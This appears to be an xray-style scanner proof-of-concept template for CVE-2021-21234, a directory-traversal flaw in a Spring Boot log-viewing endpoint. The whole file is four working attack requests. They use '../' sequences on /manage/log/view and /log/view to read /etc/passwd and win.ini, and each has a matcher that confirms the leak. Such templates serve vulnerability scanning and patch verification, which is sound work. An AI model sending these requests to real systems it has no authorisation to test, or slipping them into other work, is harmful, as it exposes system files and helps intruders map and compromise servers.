name: poc-yaml-SpringBoot-CVE-2021-21234
rules:
  - method: GET
    path: /manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
    follow_redirects: false
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
  - method: GET
    path: /log/view?filename=/etc/passwd&base=../../../../../../../../../../
    follow_redirects: false
    expression: |
      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
  - method: GET
    path: /manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
  - method: GET
    path: /log/view?filename=/windows/win.ini&base=../../../../../../../../../../
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")

detail:
  author: For3stCo1d
  description: "Spingboot目录遍历"
  links:
    - https://github.com/xiaojiangxl/CVE-2021-21234